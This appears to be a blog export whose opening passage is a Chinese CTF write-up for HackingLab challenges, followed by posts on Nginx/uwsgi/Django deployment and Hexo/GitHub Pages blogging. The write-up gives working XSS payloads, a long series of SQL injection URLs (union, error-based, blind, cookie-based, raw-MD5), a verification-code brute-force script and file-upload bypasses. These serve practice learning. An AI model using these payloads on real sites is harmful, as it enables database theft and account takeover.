"(●'◡'●)") die($flag); &#125; ?&gt; 可以看到要使^_^字段满足所有内容才可以，算是一道php审计,需要知道一些知识。$_SERVER[&#39;QUERY_STRING&#39;]：QUERY_STRING就是URL后接的参数，如www.baidu.com/?a=b，a=b就是QUERY_STRING。data伪协议：data:[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;file_exists对data指向的内容判断为不存在根据以上，可以得到^.^=data://text/plain;charset=unicode,(●’◡’●)即可得到key 9.逗比的手机验证码 你的手机号码是13388886666，验证码将会以弹窗的形式给出 点击获取验证码，然后不要submit,直接用13388886667和此验证码登陆即可。 10.基情燃烧的岁月 Tips:你是一名黑客，你怀疑你的“（男/女）闺蜜”的出轨了，你要登陆TA手机的网上营业厅查看详单，一探究竟！ 闺蜜手机号码:13388886666 验证码获取之后一直有效，直接爆破，得到前任手机号，再爆破。 11.验证码识别 Tips:验证码依然是3位数 这里抓包尝试可以发现，获取手机验证码后，手机验证码答案是不变的，图片验证码验证一次后就失效，写脚本模拟操作，然后用图像识别进行验证码破解。注：图像识别可能不正确，需多试几次。图像识别这里使用了pytesseract,其依赖于tesseract,Mac可直接使用brew install tesseract进行安装。 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python3# -*- coding: utf-8 -*-import requestsfrom PIL import Imageimport pytesseractfrom io import BytesIOindex = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php'mobi_url = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/mobi_vcode.php'url = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php'img_url = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'cookies = &#123; 'PHPSESSID': '0c610838308fc02f51bef49f7e402b20'&#125;mobi_data = &#123; 'getcode': 1, 'mobi': 13388886666&#125;s = requests.Session()s.cookies = requests.utils.cookiejar_from_dict(cookies)s.get(index)s.post(mobi_url, mobi_data)for i in range(100, 1000): img_response = s.get(img_url) img = Image.open(BytesIO(img_response.content)) vcode_number = pytesseract.image_to_string(img, lang='eng') print(vcode_number) data = &#123; 'username': 13388886666, 'mobi_code': i, 'Login': 'submit', 'user_code': vcode_number &#125; response = s.post(url, data) print(str(response.content, encoding='utf-8')) 12.XSS基础关 XSS基础:很容易就可以过关 什么都没过滤，直接&lt;script&gt;alert(HackingLab)&lt;/script&gt;即可，注意chrome下会有xss 过滤器功能，需要关闭，不然会报错。在启动后面加上disable-xss-auditor即可，例如mac下进入/Applications/Google Chrome.app/Contents/MacOS中，执行./Google\ Chrome -args --disable-xss-auditor 13.XSS基础2:简单绕过 很容易就可以过关. 没什么说的,基本操作&lt;img src=1 onerror=alert(HackingLab)&gt; 14.XSS基础3:检测与构造alert&#39; onmouseover=&quot;alert(HackingLab)&quot; 15.Principle很重要的XSS 原理/原则/理念很重要…..不是所有的xss都叫特仑苏.. ^_^Take it easy! 常规方法没想到，有个取巧的办法，直接拦截response包然后加上&lt;script&gt;alert(HackingLab)&lt;/script&gt;即可 注入关1.最简单的SQL注入发现提示是login as admin,直接构造admin&#39; or &#39;1&#39;=&#39;1即可 2.最简单的SQL注入提示id，说明key应该在某个id的页面中，直接id=1 or 1=1即可 3.防注入试过常见闭合方式之后无效，尝试宽字符注入 1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df' or 1=1%23 发现正常显示，即发现注入点。然后是一般流程： 得到字段数：12345http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df' or 1=1 order by 2 %23http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df' or 1=1 order by 3 %23http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df' or 1=1 order by 4 %23 发现到4时有问题，所以返回字段数为3。 得到显示位置：1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df' union select 1,2,3%23 发现显示2，3，所以第2、3字段的内容被显示出来，之后注入时可以通过将内容放在这两个位置上以便观察 得到所有数据库和当前数据库：1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27 union select 1,group_concat(schema_name),database() from information_schema.schemata%23 可以看到，总共有3个数据库information_schema,mydbs,test,当前使用的数据库是mydbs 得到表名1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=3%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 可以看到，mydbs数据库中只有一个表sae_user_sqli4 得到字段1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=3%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7361655F757365725F73716C6934%23 注意table_name需要使用hex()函数将字符串转为16进制数，因为&#39;被转义了。最终得到了字段id,title_1,content_1 脱裤1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27 union select 1,count(*),3 from mydbs.sae_user_sqli4%23 获取记录条数,总共4条。1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27 union select 1,group_concat(title_1,content_1),3 from mydbs.sae_user_sqli4%23 获取所有内容如下: blog systemmy blog test,so easyeasy ,flagishere#Hsaagdfs56sdf7fsdv,where is flagflag is here！ 得到flag 4.到底能不能回显 小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？ 首先尝试正常修改start和num值，发现num不会改变最终结果，尝试start=5 or 1=1&amp;num=5时，会显示: 12You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or1=1,5' at line 1Warning: mysql_fetch_row() expects parameter 1 to be resource, boolean given in sqli5_5ba0bba6a6d1b30b956843f757889552/index.php on line 51 发现number无效时好像会显示第一个。题目提示了limit注入，所以SQL语句应该是这样的: 1SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT start,num【注入点】 由于union无法在order by语句后面，通过查看select用法，可以知道后面还有procedure和into outfile,后者这里无法利用，则尝试使用procedure MySQL默认只有analyse(),analyse的用法在这里。 1234567891011121314151617181920SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] 尝试: 1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1 procedure analyse(1,1)%23&amp;num=1 看到返回 Can&#39;t use ORDER clause with this procedure,说明无法使用，尝试在analyse函数中构造错误，通过返回错误显示来得到结果,修改analyse中的参数，尝试在参数中使用语句： 1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1 procedure analyse(select 1,1)%23&amp;num=1 发现不行，报错 最后根据这篇文章，发现可能extractvalue这个函数可以使用，查看extractvalue发现他是用于xml解析，尝试构造,随便填两个字符串 1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1 procedure analyse(extractvalue(0x213,0x12),1)%23&amp;num=1 返回XPATH syntax error:,发现报错注入 1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1 procedure analyse(extractvalue(0x213,version()),1)%23&amp;num=1 返回XPATH syntax error: &#39;.73&#39;,发现显示不全，想办法在之前就开始报错,修改内容使其更好显示，这里使用concat进行查看 1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1 procedure analyse(extractvalue(1,concat(0x25,@@version)),1)%23&amp;num=1 可以看到最终错误显示了出来,之后就是正常步骤了 得到当前数据库1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1 procedure analyse(extractvalue(0x213,concat(0x25,database())),1)%23&amp;num=1 XPATH syntax error: ‘%mydbs’ 得到表名1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1 procedure analyse(extractvalue(0x21,concat(0x25,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),1)%23&amp;num=1 XPATH syntax error: ‘%article,user’注意要将语句用()括起来,不然会报语法错误。由此得到，此数据库中有2个表：article和user 得到列名123http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1 procedure analyse(extractvalue(0x21,concat(0x25,(select group_concat(column_name) from information_schema.columns where table_name=0x61727469636C65))),1)%23&amp;num=1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1 procedure analyse(extractvalue(0x21,concat(0x25,(select group_concat(column_name) from information_schema.columns where table_name=0x75736572))),1)%23&amp;num=1 XPATH syntax error: ‘%id,title,contents,isread’XPATH syntax error: ‘%id,username,password,lastloginI’分别得到每个表的字段值 得到内容查表user发现有3个记录，id为1，2，12889，且12889的username为flag，尝试获取其password值 1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1 procedure analyse(extractvalue(0x21,concat(0x25,(select group_concat(password) from user where id=12889))),1)%23&amp;num=1 XPATH syntax error: ‘%myflagishere’ 5.邂逅 小明今天出门看见了一个漂亮的帅哥和漂亮的美女，于是他写到了他的日记本里。 这题不一样的地方就是注入点不在原始url上，而在图片url上，且是宽字符注入，知道这点基本就算成功了。 得到字段1http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%df%27 or 1=1 order by 4%23 得到字段为4个，然后查看显示位： 得到显示位1http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%df%27 union select 1,2,3,4%23 这里用charles抓包显示，看到显示位为3 得到数据库名1http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%df%27 union select 1,2,database(),4%23 得到表名1http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%df%27 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=0x6D79646273%23 article,pic 得到字段123http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%df%27 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=0x61727469636C65%23http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%df%27 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=0x706963%23 article的字段: id,title,content,otherspic的字段: id,picname,data,text 得到内容1http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%df%27 union select 1,2,group_concat(id,picname),4 from mydbs.pic%23 得到图片库1dog1.jpg,2cat1.jpg,12998flagishere_askldjfklasjdfl.jpg，发现有个flag.jpg,尝试askldjfklasjdfl无效,访问图片的到IamflagIloveyou! 6.ErrorBased 本题目为手工注入学习题目，主要用于练习基于Mysql报错的手工注入。Sqlmap一定能跑出来，所以不必测试了。flag中不带key和# 首先测试，发现有错误返回1http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin%27 提示说是报错注入，尝试一下看看结果1http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin%27 union select count(*),concat( floor(rand(0)*2), 0x2d2d2d, version(), 0x2d2d2d) x from information_schema.schemata group by x%23 发现成功看到结果，之后就是常规操作了。关于报错注入，可以看这里的总结。 获取数据库名1http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin%27 union select count(*),concat( floor(rand(0)*2), 0x2d2d2d, database(), 0x2d2d2d) x from information_schema.schemata group by x%23 获取表1http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' union select count(*),concat(floor(rand(0)*2), 0x2d2d2d,(select table_name from information_schema.tables where table_schema=database() limit 0,1), 0x2d2d2d) x from information_schema.schemata group by x%23 注意这里不要用group_concat(table_name)而要一个一个去获取，最终得到log、motto、user三个表 获取列1http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' union select count(*),concat(floor(rand(0)*2), 0x2d2d2d,(select column_name from information_schema.columns where table_name=0x6D6F74746F limit 0,1), 0x2d2d2d) x from information_schema.schemata group by x%23 最后得到id、username、motto这里发现 在之后使用 select motto from mydbs.motto时无效，进而放弃，选择报错注入的另一种，利用XPath报错。 1http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' union select extractvalue('123',concat(0x3a3a,(select motto from mydbs.motto),0x3a3a))# 发现好像显示不全，只能一个个查看，limit 3,1时得到结果。 7.盲注 今天我们来学习一下盲注.小明的女朋友现在已经成了女黑阔,而小明还在每个月拿几k的收入,怎么养活女黑阔………..so:不要偷懒哦! 1http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin%27 and sleep(10)%23 可以看到延时了很久才返回，说明成功。这里手工注入太累，网站网速又慢，用sqlmap跑吧。 1python sqlmap.py -u "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=1" --technique --tables ps: 原理知道了就好了，那个网站网速太慢，sqlmap经常连不上。 8.SQL注入通用防护 小明写了一个博客系统,为了防注入,他上网找了一个SQL注入通用防护模块,GET/POST都过滤了哦! 这里常见的url注入都不起作用。最后搜索发现注入点在cookie上,需要以这种形式才能够成功:Cookie:PHPSESSID=xx;id=2 这里id后面的就是注入点。 12Cookie: PHPSESSID=xx;id=2 and 1=0%23Cookie: PHPSESSID=xx;id=2 and 1=1%23 后面就是基本操作了 9.据说哈希后的密码是不能产生注入的查看源代码，发现关键语句 1$strsql=&quot;select * from `user` where userid=&quot;.intval($_GET[&apos;userid&apos;]).&quot; and password=&apos;&quot;.md5($_GET[&apos;pwd&apos;], true) .&quot;&apos;&quot;; 这里发现userid使用intval转为数值了，后面passwd使用md5hash之后进行拼接，这里主要是利用了php md5()函数可以返回 RAW MD5的方式具体如下： 1string md5( string $str [, bool $raw_output = false] ) 这是php md5函数的文档，可以看到，当第二个参数设置为true时会返回16字节长度的原始二进制格式内容，默认返回的是32位 hex字符串， Raw MD5 hashes are dangerous in SQL statements because they can contain characters with special meaning to MySQL. The raw data could, for example, contain quotes (‘ or “) that would allow SQL injection. 即如果我们的查询语句是: 1SELECT login FROM admins WHERE password = '$raw_md5' 通过构造raw_md5值可以变成如下： 1SELECT login FROM admins WHERE password = '&lt;trash&gt;'or'1&lt;shit&gt;' 又由于mysql会将&#39;1&lt;shit&gt;&#39;这样的string转换成booltrue,从而使的注入成功。所以我们需要找到某个字符串，其MD5值插入后是这样的: 1SELECT login FROM admins WHERE password = 'xxx'||'1xxxxxxxx' ||和or相同，OR oR等内容，1的值可以为任意值。 还有一个解法就是如果RAW MD5包含&#39;xx&#39;=&#39;xx&#39;,即: 1SELECT login FROM admins WHERE password ='a'='b' 这种格式也可以，因为&#39;a&#39;=&#39;b&#39;=&#39;c&#39;会被转换成1，原因如下： ‘a’=’b’=’c’ is evaluated in this order : (‘a’=’b’)=’c’. As ‘a’ != ‘b’, ‘a’=’b’ gives us 0, and that leads us to the final comparison 0=’c’. Then, MySQL tries to cast ‘c’ as a number, and finds 0. The comparison is now : 0=0, which finally gives us 1. 所以最后附上我写的搜索程序： 12345678910111213141516171819import hashlibimport rei = 0count = 0while True: md5 = hashlib.md5(bytes(str(i), encoding='utf-8')) raw_md5 = md5.digest() hex_md5 = md5.hexdigest() pattern = re.compile(b'(\'(or|\|\|)\'\d+)|(\'=\')', flags=re.IGNORECASE) m = re.search(pattern, raw_md5) if m: print('\n%d md5: %s raw_md5: %s' % (i, hex_md5, raw_md5)) else: count += 1 if count == 5000000: print('.') count = 0 i += 1 也可在此基础上进行修改，优化，添加更加宽松的条件，会搜索的更快。 上传关1.只能上传jpg格式的图片哦~！查源码，发现在本地校验的，直接抓包修改后缀即可。 2.请上传一张jpg格式的图片同上 3.请上传一张jpg格式的图片文件名改为a.jpg.php即可 解密关1.以管理员身份登录系统 以管理员身份登录即可获取通关密码(重置即可，无需登录)补充说明：假设除了admin用户，其它用户的邮箱都可被登录获取重置密码的链接。 看了一下题目，补充说明说除了admin用户 其他用户邮箱都可以被访问，尝试重置用户admin发现没有链接，尝试重置其他任意用户xxx,发现会跳转至一个页面并提供了一个重置密码的链接，点开之后显示重置成功，这里发现重置成功的链接: 1http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=1fba4215ce1fbbef26581ceb3b981e7d&amp;username=sdfsf 发现url中有用户名，猜测应该是通过更改url参数从而实现admin账号密码重置。 尝试直接修改username=admin发现不行，尝试了几个不同的非admin账号，发现sukey字段也不一样，相同的账号每次也不一样，猜测可能是类似账号密码加salt的哈希值之类的，尝试一下常见的hash破解，发现md5值，且原内容为1508842257，不是我们猜测账号密码之类的东西，电话也不对，位数不够，突然想起来是时间戳！ 所以猜测整个重置流程会将发送邮件时候的sukey=时间戳和username一起作为验证信息来判断，从而进行重置，那就简单了，点完admin重置之后获取下时间戳然后求MD5加进去，注意要改成小写，大写好像不行，即可。 2.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>CTF</tag>
        <tag>HackingLab</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx+uwsgi+Django服务器部署]]></title>
    <url>%2Fblog%2Fnginx-uwsgi-django%2F</url>
    <content type="text"><![CDATA[本文主要介绍使用Django框架编写的服务器部署方式，采用Nginx+uwsgi，建议去理解每一个部件的具体作用，而不是去遵循教程一步步设置。 Nginx+uwsgi+Django其主要原理是:Nginx负责接收所有访问服务器的请求，静态资源(css、js、images等)等内容直接由Nginx进行返回，动态资源通过uwsgi去请求。 Nginx(engine X) Nginx is a web server, which can also be used as a reverse proxy, load balancer and HTTP cache. Nginx can be deployed to serve dynamic HTTP content on the network using FastCGI, SCGI handlers for scripts, WSGI application servers or Phusion Passenger modules, and it can serve as a software load balancer.Nginx uses an asynchronous event-driven approach to handling requests. Nginx’s modular event-driven architecture can provide more predictable performance under high loads. 在Linux操作系统下，nginx使用epoll事件模型，得益于此，nginx在Linux操作系统下效率相当高。同时Nginx在OpenBSD或FreeBSD操作系统上采用类似于epoll的高效事件模型kqueue。 HTTP proxy and Web server features Ability to handle more than 10,000 simultaneous connections with a low memory footprint (~2.5 MB per 10k inactive HTTP keep-alive connections) Handling of static files, index files and auto-indexing Reverse proxy with caching Load balancing with in-band health checks TLS/SSL with SNI and OCSP stapling support, via OpenSSL. FastCGI, SCGI, uWSGI support with caching Name- and IP address-based virtual servers IPv6-compatible WebSockets and HTTP/1.1 Upgrade Mail proxy features TLS/SSL support STARTTLS support SMTP, POP3, and IMAP proxy Authentication using an external HTTP server 上述是比较精简的Nginx介绍及主要特性，来源于维基百科Nginx，写的还是不错的。Nginx在本实例中负责监听某个端口的所有请求，然后由自己去响应静态资源，动态资源请求发给uwsgi去进一步处理。 下面介绍Nginx的使用。 Nginx安装Mac下: 1brew install nginx Linux下: 1sudo apt-get install nginx 安装是非常容易的，需要明白两个路径，一个是Nginx运行路径，一个是Nginx配置路径。 Mac下: 12运行路径 可直接使用 nginx [-s stop]配置路径 /usr/local/etc/nginx/ Linux下: 12运行路径 /etc/init.d/nginx (start | restart | stop)配置路径 /etc/nginx/ 忘记配置路径的时候可以使用nginx -t，他会测试conf文件，会显示conf的路径在哪里。 Nginx配置以Linux系统下的配置为主，Mac下与linux下区别主要是:server配置mac下默认也在nginx.conf文件中，而linux下会以include的方式进行调用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798# 定义Nginx运行的用户和用户组user www-data;# nginx进程数，建议设置为等于CPU总核心数worker_processes auto;# 全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]# 不设置的话日志在/var/log/nginx/error.log# error_log [error.log path] info;# 进程pid(进程标识符)文件pid /run/nginx.pid; # 工作模式及连接数上限events &#123; # 单个后台worker process进程的最大并发链接数 worker_connections 768; # multi_accept on;&#125;http &#123; ## # Basic Settings ## sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings ## # 开启gzip压缩 gzip on; gzip_disable "msie6"; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## # 引用server 配置 include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*;&#125;mail &#123; # See sample authentication script at: # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript # auth_http localhost/auth.php; # pop3_capabilities "TOP" "USER"; # imap_capabilities "IMAP4rev1" "UIDPLUS"; server &#123; listen localhost:110; protocol pop3; proxy on; &#125; server &#123; listen localhost:143; protocol imap; proxy on; &#125;&#125; 可以看到在虚拟主机配置时，引用了两个目录下的文件，一个是conf.d，一个是sites-enabled，一般我们只修改后者。我们在配置路径下会看到两个文件夹都以sites-为前缀: sites-enabled sites-available 这两个的关系: If you are coming from Apache, the “sites-available” and “sites-enabled” directories will be familiar. These directories are used to define configurations for your websites.Files are generally created in the “sites-available” directory, and then symbolically linked to the “sites-enabled” directory when they are readyto go live. 也就是说在sites-available中进行修改或者新增配置，之后在sites-enabled中增加一个sites-available相应配置文件的链接，也就是配置文件在sites-enabled中激活。 123456789101112131415161718192021222324252627server &#123; # 侦听80端口 listen 80; # 服务器IP地址或域名 server_name [address]; # 设定本虚拟主机的访问日志 access_log logs/nginx.access.log main; # 定义错误提示页面 error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; # 默认请求 location / &#123; root [index path]; #定义首页索引文件的名称 index index.html index.htm; &#125; #静态文件，nginx自己处理 location /static/ &#123; alias [static path]; &#125;&#125; uwsgi uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http等协议。Nginx中HttpUwsgiModule的作用是与uWSGI服务器进行交换。WSGI是一种Web服务器网关接口。它是一个Web服务器（如nginx，uWSGI等服务器）与web应用（如用Flask框架写的程序）通信的一种规范。 要注意 WSGI / uwsgi / uWSGI 这三个概念的区分。 WSGI是一种通信协议。 uwsgi是一种线路协议而不是通信协议，在此常用于在uWSGI服务器与其他网络服务器的数据通信。 而uWSGI是实现了uwsgi和WSGI两种协议的Web服务器。 安装1pip install uwsgi 配置uwsgi 有两种设置参数的方式，一种是--field value的参数形式加载uwsgi后面，还有一种以uwsgi.ini的格式作为配置文件，然后使用uwsgi -ini uwsgi.ini的方式运行，其输出结果会存在uwsgi.log文件中。下面介绍常用的字段(--field value在配置文件中均以field = value的格式呈现): 123456789101112131415161718192021222324252627[uwsgi]# Django-related settingshttp = :8001 #如果使用nginx+uwsgi 必须使用socket = ：8001# the base directory (full path)chdir = [dirname]# Django s wsgi filemodule = [projectname].wsgi# process-related settings# mastermaster = true# ... with appropriate permissions - may be needed# chmod-socket = 664# clear environment on exitvacuum = trueplugin python = true# set log file pathdaemonize = [uwsgi.log path]# the virtualenvhome = [env path] 记得在uwsgi.ini中添加plugin python = true,不然可能会有问题 Djangodjango部分就不再多说，将uwsgi和nginx启动起来之后，就可以访问了，这里提醒两点: django静态资源使用python manage.py collectstatic集中起来，存放的路径会根据settings.py中的配置。 记得修改settings.py中的ALLOWED_HOSTS字段，例如运行所有IP地址访问:ALLOWED_HOSTS = [&#39;*&#39;]]]></content>
      <categories>
        <category>web development</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>uwsgi</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo+Pages搭建个人博客及相关配置]]></title>
    <url>%2Fblog%2Fpages-blog%2F</url>
    <content type="text"><![CDATA[这里记录了通过hexo+pages服务搭建个人博客的一些常见问题和误区，都是血泪经验。 hexo环境搭建Hexo基于Node.js，可以通过npm安装，具体使用可以看官网教程，很简单。推荐使用LTS版本，Mac下V8.x的nodejs安装的hexo有时候会提示module not found,所以最好用稳定版。推荐把官方文档仔细的看一遍，你要知道你自己在做什么。hexo安装好了之后，初始化等等不在此赘述，配置好之后基本以下命令就够了： 1234hexo clean # 清除生成的public folder内容hexo generate / hexo g # 生成发布的内容hexo server / hexo s # 启动本地serverhexo deploy / hexo d # 根据repo设置部署 Pages搭建Github Pages可以是由用户编写的、托管在github上的静态网页，因其空间免费、服务器稳定，作为Blog的托管方最为合适不过，不过需要注意的是，必须是public repo才可以。当然也可以选择使用自己的云服务器然后用Nginx或Apache等方式，不在本文讨论范围内，可以参考Nginx配置将其中server改成如下即可，如有问题，可以在给我发邮件： 1234location / &#123; root [your deploy dir path]; index index.html index.htm;&#125; Github上需要新建一个名为[github_username].github.io的仓库，然后在settings——Github Pages选择所在分支，我这里的截图是已经绑定过自定义域名，还没绑定的话会显示Your site is published at http://[username].github.io,之后访问[username].github.io,就会自动从index.html进入，域名绑定可以参考下一小节: 这样，当在hexo的_config.yml中设置了deploy地址之后，运行hexo d会在目录下生成一个.deploy_git文件夹，里面的内容和[username].github.io内容是同步的，只需要每次部署之后，会自动用git推送的远程仓库，这样Pages的内容就会得到更新，不必手动push。 绑定自定义域名域名绑定，首先你需要有一个域名，无论是收费的还是免费的，都可以，我这里是使用.com的顶级域名，是在万网买的。买到之后，进入控制台，左边点击域名与网站——域名,顶级域名.com &amp; .net现在需要实名认证，注意一下。进入域名解析，添加三条记录：这里两条A记录指向的是Github Pages提供的IP地址，CNMAE填写自己的*.github.io,意思是指向*.github.io这里。之后再在Github Pages的Custom domain中填写自己的域名:自定义域名还需要告诉服务器你所绑定的CNAME是什么，即需要写一个文件名为CNAME的文件，内容为你的域名: 1hellohxk.com 为了使每次生成的内容都包含这样一个文件，可以将这个文件放到/source中，这样生成的内容每次都有这样一个文件。然后等待一段时间，就好了。 Github Coding.net 双部署由于基本都在国内，访问的人一般都是国内，github的速度还是有些慢的，尤其是如果需要加载大量图片，会一直loading。所以我这里考虑使用国内的coding.net作为主服务器，海外采用访问Github的方式。Coding.net Pages和github没什么区别，很容易上手，注意，我这里采用了项目Pages,而没有采用用户Pages，具体差别如下：我采用了新建一个项目，然后部署其到coding-pages分支，具体confi如下： 1234567# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: github: git@github.com:emptyxl/emptyxl.github.io.git,master coding: git@git.coding.net:empty_xl/empty_xl.git,coding-pages 之后使用hexo d即可推送到coding.net 和 github两端。在进入阿里云域名解析，添加一条新的CNAME,主机记录www，记录值为pages.coding.me，之后即可在coding.netpages服务上选择绑定自定义域名。最终如下：这里发现我多了一条A记录指向103.72.145.7，只是由于在coding.net pages会自动帮你申请Let&#39;s Encrypt的SSL/LTS证书，有可能会出现无效IP地址的情况，需要添加这一条A记录，指向ping pages.coding.net的值。 使用HTTPS ——没有小绿锁的网站大概会有人访问？ Github Pages 默认不提供自定义域名的HTTPS，即只有*.github.io可以强制使用HTTPS，目前的自定义域名HTTPS方案如下： 部署方式 解决方案 Github 部署 使用CloudFare Coding.net 部署 使用自带的Let&#39;s Encrypt CloudFare注册之后，选择Add a Websites,然后进行扫描，之后点击continue:扫描完后，添加record，其值为之前的的github CNAME 与A记录IP地址值，然后选择Free套餐，之后将阿里云DNS改为至此等待一段时间，即可看到status:Active在Crypto菜单中，可以选择SSL连接方式，不同方式区别如下：由于github自定义域名不支持HTTPS，所以只能选择Flexible,即所谓的HTTPS只是浏览器 —&gt;CloudFare是HTTPS 而cloudFare —&gt; Github 还是HTTP的方式。在Page Rules中可以设置强制HTTPS，如下: Next主题推荐两个主题吧，一个是之前使用过的Hux Theme，一个是现在使用的Next，毕竟9k star，一直在维护，提issue基本热心网友都会回复，还是挺不错的，而且第三方服务也基本集成好了，用的很方便，毕竟我们是用来写文章的，而不是写博客和主题框架的。Next下载的时候推荐下载Release版本。因为会经常修改，latest branch有时候会因为修改调试而产生奇异的问题，所以还是别折腾了。本网站采用Next.Mist，大体样子如下：常见问题和配置，可以看Next官网、Next Issues、Next Wiki，常见的问题基本都有。这里我总结一下常见和比较难找的内容，放出来修改的文件路径。 Footer修改文章底部Footer内容看起来比较别扭，可以根据自己的喜好修改：文件路径: /themes/next/layout/_partials/footer.swig 